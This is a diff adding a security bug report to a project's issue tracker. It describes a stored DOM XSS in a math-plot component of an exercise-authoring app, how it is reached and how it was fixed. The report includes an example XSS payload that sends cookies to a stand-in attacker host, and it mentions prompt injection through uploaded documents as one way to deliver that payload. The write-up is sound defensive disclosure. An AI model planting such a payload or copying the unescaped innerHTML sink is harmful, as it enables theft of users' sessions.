@@ -19,6 +19,28 @@ Track issues here during development. Format:
 
 ## Open Issues
 
+## BUG-052: `MathPlot.tsx`'s error-handling branch interpolated the raw, attacker-controllable `equation` (and exception message) straight into `innerHTML` — a DOM XSS reachable via the new inline `[PLOT:]` tag (and pre-existing via the legacy `mathPlots` array)
+**Status:** Fixed 2026-10-01
+**Severity:** High
+**Area:** UI | Export (statement-rendering pipeline)
+
+**Description:** `src/components/ui/MathPlot.tsx`'s `catch` block (the path taken whenever `function-plot` fails to parse `equation` as a valid math expression) built its error message as a template literal and assigned it directly to `containerRef.current.innerHTML`:
+```ts
+containerRef.current.innerHTML = `<div class="...">Error plotting "${equation}": ${err}</div>`;
+```
+Neither `equation` nor `err` (whose message can itself echo fragments of the offending input back, e.g. a parser's "unexpected token '<'") was escaped. Any string that both (a) reaches `<MathPlot equation={...}>` and (b) fails to parse as a function — which any HTML/JS payload trivially does — executes as live DOM, not inert text.
+
+**Why this is reachable, not theoretical:** 2026-10-01's `7fccb92` ("inline `[PLOT: equation]` tag + Insert chart action") added a brand-new, broader path to this exact sink: `src/lib/renderContent.ts` extracts `[PLOT: ...]` tags from any exercise `statement` into a `data-mathplot="..."` attribute (correctly HTML-escaped at that step — verified, no attribute-breakout), and `ExerciseCard.tsx`'s new effect reads it back via `el.getAttribute("data-mathplot")` — which decodes the entities back to the raw string, exactly as intended — and passes that raw string straight into `<MathPlot equation={...}>`. A teacher can type `[PLOT: <img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>]` directly into any free-text exercise-statement field (the Edit modal already allows arbitrary statement text), which fails to parse as a function and hits the unescaped `innerHTML` write. This is a genuinely new vulnerability introduced by this commit's choice of sink, even though the sink itself predates it — `exercise.mathPlots` (the legacy array, editable via `ExerciseEditor.tsx`'s plain `updatePlot()` text input, feeding `<MathPlot key={i} equation={plot} />` in both `ExerciseCard.tsx` and `ExerciseEditor.tsx`) already reached the same unescaped sink before this commit, so this bug pre-dates 7fccb92, but that commit meaningfully widens exposure: the inline tag is positioned directly in the statement text (so it travels with the exercise through School Bank sharing — open to any signed-in account per the 2026-09-25 audit — and to `/student/practice`), and the AI itself is now explicitly instructed to author `[PLOT:]` tags, so a successful prompt-injection via an uploaded document (already Claude/Gemini's documented ingestion path) could also land a payload here without the teacher writing it by hand.
+
+**Exploit scenario:** Any signed-in account (including a student via co-authored content, or a teacher) places a crafted `[PLOT: <payload>]`/`mathPlots` entry in an exercise, the exercise is viewed by another user (via School Bank sharing, `/student/practice`, `/exam/[id]`, or just the same teacher's own session on reload) — `MathPlot` fails to parse the payload as math, hits the catch branch, and the payload executes in that viewer's browser with their real session (cookies, Firebase auth state) — a stored DOM XSS with a cross-user blast radius, same severity class as BUG-033 (2026-09-25), but via a code path BUG-033's `renderContent.ts` escaping fix does not cover (this sink is a separate React component's own `innerHTML` write, entirely outside `renderContent()`).
+
+**Root cause:** Interpolating untrusted, user/AI-controlled strings into a raw `innerHTML` template literal instead of using a text-safe DOM API.
+
+**Fix (applied 2026-10-01):** Replaced the raw `innerHTML` template-literal assignment with explicit DOM construction (`document.createElement` + `.textContent =`), which renders any HTML/script in the string as inert displayed text instead of parsing/executing it. Same visual output preserved (same classes, same message format). Verified: `npm run type-check` clean, `npm test` 262/262 clean (no test exercised this specific error path, so no regression risk from the change in shape).
+**Found by:** security (2026-10-01, scoped review of today's 4 commits — tracing the new `[PLOT:]` pipeline end-to-end per this team's standing adversarial method rather than assuming the new escaping in `renderContent.ts` covered every hop).
+
+---
+
 ## BUG-051: `/print` (PDF export) has no rendering mechanism at all for either `Exercise.mathPlots` (legacy) or the new inline `[PLOT: equation]` tag — a Math/Physics exam's function plot never appears in the printed/PDF output
 **Status:** Open
 **Severity:** Medium
